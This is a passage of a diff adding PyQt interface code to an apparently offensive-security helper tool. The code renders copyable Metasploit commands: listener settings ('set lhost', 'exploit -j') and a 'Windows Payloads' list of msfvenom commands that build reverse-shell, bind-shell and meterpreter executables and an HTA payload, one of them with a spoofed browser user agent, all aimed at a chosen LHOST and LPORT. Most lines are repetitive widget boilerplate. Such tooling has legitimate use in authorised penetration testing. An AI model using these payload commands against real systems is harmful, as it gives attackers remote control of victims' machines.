+        self.msfv_listener_spacer2 = QLabel()
+        self.msfv_listener_spacer2.setFixedWidth(40)
+        self.msfv_listener_spacer2.setFixedHeight(50)
+     
+        # msfv_listener spacer & divider layout
+        self.tab7_container_layout.insertWidget(45, self.msfv_listener_spacer1)
+        self.tab7_container_layout.insertWidget(46, self.msfv_listener_divider1)
+        self.tab7_container_layout.insertWidget(47, self.msfv_listener_divider2)
+        self.tab7_container_layout.insertWidget(48, self.msfv_listener_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_listener_Scan3
+        if hasattr(self, 'msfv_listener_Scan3'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan3)
+            self.msfv_listener_Scan3.deleteLater()
+        self.msfv_listener_Scan3 = QLabel("set lhost " + self.lhost + "")
+        self.msfv_listener_Scan3.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(49,self.msfv_listener_Scan3)
+     
+        # msfv_listener_Scan3_Copy
+        if hasattr(self, 'msfv_listener_Scan3_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan3_Copy)
+            self.msfv_listener_Scan3_Copy.deleteLater()
+        self.msfv_listener_Scan3_Copy = QPushButton()
+        self.msfv_listener_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_listener_Scan3_Copy.setFixedSize(QSize(20,20))
+        self.msfv_listener_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_listener_Scan3.text()))
+        self.msfv_listener_Scan3_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_listener_Scan3 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_listener_Scan3_Copy)
+        label_layout.addWidget(self.msfv_listener_Scan3)
+        self.tab7_container_layout.insertLayout(50, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_listener_divider1
+        if hasattr(self, 'msfv_listener_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_divider1)
+            self.msfv_listener_divider1.deleteLater()
+        self.msfv_listener_divider1 = QFrame()
+        self.msfv_listener_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_listener_divider1.setLineWidth(3)
+        self.msfv_listener_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_listener_divider2
+        if hasattr(self, 'msfv_listener_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_divider2)
+            self.msfv_listener_divider2.deleteLater()
+        self.msfv_listener_divider2 = QFrame()
+        self.msfv_listener_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_listener_divider2.setLineWidth(3)
+        self.msfv_listener_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_listener_spacer1
+        if hasattr(self, 'msfv_listener_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer1)
+            self.msfv_listener_spacer1.deleteLater()
+        self.msfv_listener_spacer1 = QLabel()
+        self.msfv_listener_spacer1.setFixedWidth(40)
+        self.msfv_listener_spacer1.setFixedHeight(50)
+     
+        # msfv_listener_spacer2
+        if hasattr(self, 'msfv_listener_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer2)
+            self.msfv_listener_spacer2.deleteLater()
+        self.msfv_listener_spacer2 = QLabel()
+        self.msfv_listener_spacer2.setFixedWidth(40)
+        self.msfv_listener_spacer2.setFixedHeight(50)
+     
+        # msfv_listener spacer & divider layout
+        self.tab7_container_layout.insertWidget(51, self.msfv_listener_spacer1)
+        self.tab7_container_layout.insertWidget(52, self.msfv_listener_divider1)
+        self.tab7_container_layout.insertWidget(53, self.msfv_listener_divider2)
+        self.tab7_container_layout.insertWidget(54, self.msfv_listener_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_listener_Scan4
+        if hasattr(self, 'msfv_listener_Scan4'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan4)
+            self.msfv_listener_Scan4.deleteLater()
+        self.msfv_listener_Scan4 = QLabel("set lport " + self.lport + "")
+        self.msfv_listener_Scan4.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(55,self.msfv_listener_Scan4)
+     
+        # msfv_listener_Scan4_Copy
+        if hasattr(self, 'msfv_listener_Scan4_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan4_Copy)
+            self.msfv_listener_Scan4_Copy.deleteLater()
+        self.msfv_listener_Scan4_Copy = QPushButton()
+        self.msfv_listener_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_listener_Scan4_Copy.setFixedSize(QSize(20,20))
+        self.msfv_listener_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_listener_Scan4.text()))
+        self.msfv_listener_Scan4_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_listener_Scan4 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_listener_Scan4_Copy)
+        label_layout.addWidget(self.msfv_listener_Scan4)
+        self.tab7_container_layout.insertLayout(56, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_listener_divider1
+        if hasattr(self, 'msfv_listener_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_divider1)
+            self.msfv_listener_divider1.deleteLater()
+        self.msfv_listener_divider1 = QFrame()
+        self.msfv_listener_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_listener_divider1.setLineWidth(3)
+        self.msfv_listener_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_listener_divider2
+        if hasattr(self, 'msfv_listener_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_divider2)
+            self.msfv_listener_divider2.deleteLater()
+        self.msfv_listener_divider2 = QFrame()
+        self.msfv_listener_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_listener_divider2.setLineWidth(3)
+        self.msfv_listener_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_listener_spacer1
+        if hasattr(self, 'msfv_listener_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer1)
+            self.msfv_listener_spacer1.deleteLater()
+        self.msfv_listener_spacer1 = QLabel()
+        self.msfv_listener_spacer1.setFixedWidth(40)
+        self.msfv_listener_spacer1.setFixedHeight(50)
+     
+        # msfv_listener_spacer2
+        if hasattr(self, 'msfv_listener_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer2)
+            self.msfv_listener_spacer2.deleteLater()
+        self.msfv_listener_spacer2 = QLabel()
+        self.msfv_listener_spacer2.setFixedWidth(40)
+        self.msfv_listener_spacer2.setFixedHeight(50)
+     
+        # msfv_listener spacer & divider layout
+        self.tab7_container_layout.insertWidget(57, self.msfv_listener_spacer1)
+        self.tab7_container_layout.insertWidget(58, self.msfv_listener_divider1)
+        self.tab7_container_layout.insertWidget(59, self.msfv_listener_divider2)
+        self.tab7_container_layout.insertWidget(60, self.msfv_listener_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_listener_Scan5
+        if hasattr(self, 'msfv_listener_Scan5'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan5)
+            self.msfv_listener_Scan5.deleteLater()
+        self.msfv_listener_Scan5 = QLabel("set ExitOnSession false")
+        self.msfv_listener_Scan5.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(61,self.msfv_listener_Scan5)
+     
+        # msfv_listener_Scan5_Copy
+        if hasattr(self, 'msfv_listener_Scan5_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan5_Copy)
+            self.msfv_listener_Scan5_Copy.deleteLater()
+        self.msfv_listener_Scan5_Copy = QPushButton()
+        self.msfv_listener_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_listener_Scan5_Copy.setFixedSize(QSize(20,20))
+        self.msfv_listener_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_listener_Scan5.text()))
+        self.msfv_listener_Scan5_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_listener_Scan5 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_listener_Scan5_Copy)
+        label_layout.addWidget(self.msfv_listener_Scan5)
+        self.tab7_container_layout.insertLayout(62, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_listener_divider1
+        if hasattr(self, 'msfv_listener_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_divider1)
+            self.msfv_listener_divider1.deleteLater()
+        self.msfv_listener_divider1 = QFrame()
+        self.msfv_listener_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_listener_divider1.setLineWidth(3)
+        self.msfv_listener_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_listener_divider2
+        if hasattr(self, 'msfv_listener_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_divider2)
+            self.msfv_listener_divider2.deleteLater()
+        self.msfv_listener_divider2 = QFrame()
+        self.msfv_listener_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_listener_divider2.setLineWidth(3)
+        self.msfv_listener_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_listener_spacer1
+        if hasattr(self, 'msfv_listener_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer1)
+            self.msfv_listener_spacer1.deleteLater()
+        self.msfv_listener_spacer1 = QLabel()
+        self.msfv_listener_spacer1.setFixedWidth(40)
+        self.msfv_listener_spacer1.setFixedHeight(50)
+     
+        # msfv_listener_spacer2
+        if hasattr(self, 'msfv_listener_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer2)
+            self.msfv_listener_spacer2.deleteLater()
+        self.msfv_listener_spacer2 = QLabel()
+        self.msfv_listener_spacer2.setFixedWidth(40)
+        self.msfv_listener_spacer2.setFixedHeight(50)
+     
+        # msfv_listener spacer & divider layout
+        self.tab7_container_layout.insertWidget(63, self.msfv_listener_spacer1)
+        self.tab7_container_layout.insertWidget(64, self.msfv_listener_divider1)
+        self.tab7_container_layout.insertWidget(65, self.msfv_listener_divider2)
+        self.tab7_container_layout.insertWidget(66, self.msfv_listener_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_listener_Scan6
+        if hasattr(self, 'msfv_listener_Scan6'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan6)
+            self.msfv_listener_Scan6.deleteLater()
+        self.msfv_listener_Scan6 = QLabel("exploit -j")
+        self.msfv_listener_Scan6.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(67,self.msfv_listener_Scan6)
+     
+        # msfv_listener_Scan6_Copy
+        if hasattr(self, 'msfv_listener_Scan6_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan6_Copy)
+            self.msfv_listener_Scan6_Copy.deleteLater()
+        self.msfv_listener_Scan6_Copy = QPushButton()
+        self.msfv_listener_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_listener_Scan6_Copy.setFixedSize(QSize(20,20))
+        self.msfv_listener_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_listener_Scan6.text()))
+        self.msfv_listener_Scan6_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_listener_Scan6 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_listener_Scan6_Copy)
+        label_layout.addWidget(self.msfv_listener_Scan6)
+        self.tab7_container_layout.insertLayout(68, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_listener_divider1
+        if hasattr(self, 'msfv_listener_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_divider1)
+            self.msfv_listener_divider1.deleteLater()
+        self.msfv_listener_divider1 = QFrame()
+        self.msfv_listener_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_listener_divider1.setLineWidth(3)
+        self.msfv_listener_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_listener_divider2
+        if hasattr(self, 'msfv_listener_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_divider2)
+            self.msfv_listener_divider2.deleteLater()
+        self.msfv_listener_divider2 = QFrame()
+        self.msfv_listener_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_listener_divider2.setLineWidth(3)
+        self.msfv_listener_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_listener_spacer1
+        if hasattr(self, 'msfv_listener_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer1)
+            self.msfv_listener_spacer1.deleteLater()
+        self.msfv_listener_spacer1 = QLabel()
+        self.msfv_listener_spacer1.setFixedWidth(40)
+        self.msfv_listener_spacer1.setFixedHeight(50)
+     
+        # msfv_listener_spacer2
+        if hasattr(self, 'msfv_listener_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer2)
+            self.msfv_listener_spacer2.deleteLater()
+        self.msfv_listener_spacer2 = QLabel()
+        self.msfv_listener_spacer2.setFixedWidth(40)
+        self.msfv_listener_spacer2.setFixedHeight(50)
+     
+        # msfv_listener spacer & divider layout
+        self.tab7_container_layout.insertWidget(69, self.msfv_listener_spacer1)
+        self.tab7_container_layout.insertWidget(70, self.msfv_listener_divider1)
+        self.tab7_container_layout.insertWidget(71, self.msfv_listener_divider2)
+        self.tab7_container_layout.insertWidget(72, self.msfv_listener_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_windows
+        if hasattr(self, 'msfv_windows'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows)
+            self.msfv_windows.deleteLater()
+        self.msfv_windows = QLabel("[+ Windows Payloads ]")
+        self.msfv_windows.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(73,self.msfv_windows)
+     
+        # msfv_windows_Scan1
+        if hasattr(self, 'msfv_windows_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan1)
+            self.msfv_windows_Scan1.deleteLater()
+        self.msfv_windows_Scan1 = QLabel("msfvenom -p windows/x64/shell_reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f hta-psh -o shell.hta")
+        self.msfv_windows_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(74,self.msfv_windows_Scan1)
+     
+        # msfv_windows_Scan1_Copy
+        if hasattr(self, 'msfv_windows_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan1_Copy)
+            self.msfv_windows_Scan1_Copy.deleteLater()
+        self.msfv_windows_Scan1_Copy = QPushButton()
+        self.msfv_windows_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_windows_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_windows_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_windows_Scan1.text()))
+        self.msfv_windows_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_windows_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_windows_Scan1_Copy)
+        label_layout.addWidget(self.msfv_windows_Scan1)
+        self.tab7_container_layout.insertLayout(75, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_windows_divider1
+        if hasattr(self, 'msfv_windows_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_divider1)
+            self.msfv_windows_divider1.deleteLater()
+        self.msfv_windows_divider1 = QFrame()
+        self.msfv_windows_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_windows_divider1.setLineWidth(3)
+        self.msfv_windows_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_windows_divider2
+        if hasattr(self, 'msfv_windows_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_divider2)
+            self.msfv_windows_divider2.deleteLater()
+        self.msfv_windows_divider2 = QFrame()
+        self.msfv_windows_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_windows_divider2.setLineWidth(3)
+        self.msfv_windows_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_windows_spacer1
+        if hasattr(self, 'msfv_windows_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer1)
+            self.msfv_windows_spacer1.deleteLater()
+        self.msfv_windows_spacer1 = QLabel()
+        self.msfv_windows_spacer1.setFixedWidth(40)
+        self.msfv_windows_spacer1.setFixedHeight(50)
+     
+        # msfv_windows_spacer2
+        if hasattr(self, 'msfv_windows_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer2)
+            self.msfv_windows_spacer2.deleteLater()
+        self.msfv_windows_spacer2 = QLabel()
+        self.msfv_windows_spacer2.setFixedWidth(40)
+        self.msfv_windows_spacer2.setFixedHeight(50)
+     
+        # msfv_windows spacer & divider layout
+        self.tab7_container_layout.insertWidget(76, self.msfv_windows_spacer1)
+        self.tab7_container_layout.insertWidget(77, self.msfv_windows_divider1)
+        self.tab7_container_layout.insertWidget(78, self.msfv_windows_divider2)
+        self.tab7_container_layout.insertWidget(79, self.msfv_windows_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_windows_Scan2
+        if hasattr(self, 'msfv_windows_Scan2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan2)
+            self.msfv_windows_Scan2.deleteLater()
+        self.msfv_windows_Scan2 = QLabel("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f exe > shell.exe")
+        self.msfv_windows_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(80,self.msfv_windows_Scan2)
+     
+        # msfv_windows_Scan2_Copy
+        if hasattr(self, 'msfv_windows_Scan2_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan2_Copy)
+            self.msfv_windows_Scan2_Copy.deleteLater()
+        self.msfv_windows_Scan2_Copy = QPushButton()
+        self.msfv_windows_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_windows_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.msfv_windows_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_windows_Scan2.text()))
+        self.msfv_windows_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_windows_Scan2 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_windows_Scan2_Copy)
+        label_layout.addWidget(self.msfv_windows_Scan2)
+        self.tab7_container_layout.insertLayout(81, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_windows_divider1
+        if hasattr(self, 'msfv_windows_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_divider1)
+            self.msfv_windows_divider1.deleteLater()
+        self.msfv_windows_divider1 = QFrame()
+        self.msfv_windows_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_windows_divider1.setLineWidth(3)
+        self.msfv_windows_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_windows_divider2
+        if hasattr(self, 'msfv_windows_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_divider2)
+            self.msfv_windows_divider2.deleteLater()
+        self.msfv_windows_divider2 = QFrame()
+        self.msfv_windows_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_windows_divider2.setLineWidth(3)
+        self.msfv_windows_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_windows_spacer1
+        if hasattr(self, 'msfv_windows_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer1)
+            self.msfv_windows_spacer1.deleteLater()
+        self.msfv_windows_spacer1 = QLabel()
+        self.msfv_windows_spacer1.setFixedWidth(40)
+        self.msfv_windows_spacer1.setFixedHeight(50)
+     
+        # msfv_windows_spacer2
+        if hasattr(self, 'msfv_windows_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer2)
+            self.msfv_windows_spacer2.deleteLater()
+        self.msfv_windows_spacer2 = QLabel()
+        self.msfv_windows_spacer2.setFixedWidth(40)
+        self.msfv_windows_spacer2.setFixedHeight(50)
+     
+        # msfv_windows spacer & divider layout
+        self.tab7_container_layout.insertWidget(82, self.msfv_windows_spacer1)
+        self.tab7_container_layout.insertWidget(83, self.msfv_windows_divider1)
+        self.tab7_container_layout.insertWidget(84, self.msfv_windows_divider2)
+        self.tab7_container_layout.insertWidget(85, self.msfv_windows_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_windows_Scan3
+        if hasattr(self, 'msfv_windows_Scan3'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan3)
+            self.msfv_windows_Scan3.deleteLater()
+        self.msfv_windows_Scan3 = QLabel("msfvenom -p windows/meterpreter_reverse_http LHOST=" + self.lhost + " LPORT=" + self.lport + " HttpUserAgent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\" -f exe > shell.exe")
+        self.msfv_windows_Scan3.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(86,self.msfv_windows_Scan3)
+     
+        # msfv_windows_Scan3_Copy
+        if hasattr(self, 'msfv_windows_Scan3_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan3_Copy)
+            self.msfv_windows_Scan3_Copy.deleteLater()
+        self.msfv_windows_Scan3_Copy = QPushButton()
+        self.msfv_windows_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_windows_Scan3_Copy.setFixedSize(QSize(20,20))
+        self.msfv_windows_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_windows_Scan3.text()))
+        self.msfv_windows_Scan3_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_windows_Scan3 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_windows_Scan3_Copy)
+        label_layout.addWidget(self.msfv_windows_Scan3)
+        self.tab7_container_layout.insertLayout(87, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_windows_divider1
+        if hasattr(self, 'msfv_windows_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_divider1)
+            self.msfv_windows_divider1.deleteLater()
+        self.msfv_windows_divider1 = QFrame()
+        self.msfv_windows_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_windows_divider1.setLineWidth(3)
+        self.msfv_windows_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_windows_divider2
+        if hasattr(self, 'msfv_windows_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_divider2)
+            self.msfv_windows_divider2.deleteLater()
+        self.msfv_windows_divider2 = QFrame()
+        self.msfv_windows_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_windows_divider2.setLineWidth(3)
+        self.msfv_windows_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_windows_spacer1
+        if hasattr(self, 'msfv_windows_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer1)
+            self.msfv_windows_spacer1.deleteLater()
+        self.msfv_windows_spacer1 = QLabel()
+        self.msfv_windows_spacer1.setFixedWidth(40)
+        self.msfv_windows_spacer1.setFixedHeight(50)
+     
+        # msfv_windows_spacer2
+        if hasattr(self, 'msfv_windows_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer2)
+            self.msfv_windows_spacer2.deleteLater()
+        self.msfv_windows_spacer2 = QLabel()
+        self.msfv_windows_spacer2.setFixedWidth(40)
+        self.msfv_windows_spacer2.setFixedHeight(50)
+     
+        # msfv_windows spacer & divider layout
+        self.tab7_container_layout.insertWidget(88, self.msfv_windows_spacer1)
+        self.tab7_container_layout.insertWidget(89, self.msfv_windows_divider1)
+        self.tab7_container_layout.insertWidget(90, self.msfv_windows_divider2)
+        self.tab7_container_layout.insertWidget(91, self.msfv_windows_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_windows_Scan4
+        if hasattr(self, 'msfv_windows_Scan4'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan4)
+            self.msfv_windows_Scan4.deleteLater()
+        self.msfv_windows_Scan4 = QLabel("msfvenom -p windows/meterpreter/bind_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f exe > shell.exe")
+        self.msfv_windows_Scan4.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(92,self.msfv_windows_Scan4)
+     
+        # msfv_windows_Scan4_Copy
+        if hasattr(self, 'msfv_windows_Scan4_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan4_Copy)
+            self.msfv_windows_Scan4_Copy.deleteLater()
+        self.msfv_windows_Scan4_Copy = QPushButton()
+        self.msfv_windows_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_windows_Scan4_Copy.setFixedSize(QSize(20,20))
+        self.msfv_windows_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_windows_Scan4.text()))
+        self.msfv_windows_Scan4_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_windows_Scan4 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_windows_Scan4_Copy)
+        label_layout.addWidget(self.msfv_windows_Scan4)
+        self.tab7_container_layout.insertLayout(93, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_windows_divider1
+        if hasattr(self, 'msfv_windows_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_divider1)
+            self.msfv_windows_divider1.deleteLater()
+        self.msfv_windows_divider1 = QFrame()
+        self.msfv_windows_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_windows_divider1.setLineWidth(3)
+        self.msfv_windows_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_windows_divider2
+        if hasattr(self, 'msfv_windows_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_divider2)
+            self.msfv_windows_divider2.deleteLater()
+        self.msfv_windows_divider2 = QFrame()
+        self.msfv_windows_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_windows_divider2.setLineWidth(3)
+        self.msfv_windows_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_windows_spacer1
+        if hasattr(self, 'msfv_windows_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer1)
+            self.msfv_windows_spacer1.deleteLater()
+        self.msfv_windows_spacer1 = QLabel()
+        self.msfv_windows_spacer1.setFixedWidth(40)
+        self.msfv_windows_spacer1.setFixedHeight(50)
+     
+        # msfv_windows_spacer2
+        if hasattr(self, 'msfv_windows_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer2)
+            self.msfv_windows_spacer2.deleteLater()
+        self.msfv_windows_spacer2 = QLabel()
+        self.msfv_windows_spacer2.setFixedWidth(40)
+        self.msfv_windows_spacer2.setFixedHeight(50)
+     
+        # msfv_windows spacer & divider layout
+        self.tab7_container_layout.insertWidget(94, self.msfv_windows_spacer1)
+        self.tab7_container_layout.insertWidget(95, self.msfv_windows_divider1)
+        self.tab7_container_layout.insertWidget(96, self.msfv_windows_divider2)
+        self.tab7_container_layout.insertWidget(97, self.msfv_windows_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_windows_Scan5
+        if hasattr(self, 'msfv_windows_Scan5'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan5)
+            self.msfv_windows_Scan5.deleteLater()
+        self.msfv_windows_Scan5 = QLabel("msfvenom -p windows/shell/reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f exe > shell.exe")
+        self.msfv_windows_Scan5.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(98,self.msfv_windows_Scan5)
+     
+        # msfv_windows_Scan5_Copy
+        if hasattr(self, 'msfv_windows_Scan5_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan5_Copy)
+            self.msfv_windows_Scan5_Copy.deleteLater()
+        self.msfv_windows_Scan5_Copy = QPushButton()
+        self.msfv_windows_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_windows_Scan5_Copy.setFixedSize(QSize(20,20))
+        self.msfv_windows_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_windows_Scan5.text()))
+        self.msfv_windows_Scan5_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_windows_Scan5 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_windows_Scan5_Copy)
+        label_layout.addWidget(self.msfv_windows_Scan5)
+        self.tab7_container_layout.insertLayout(99, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_windows_divider1
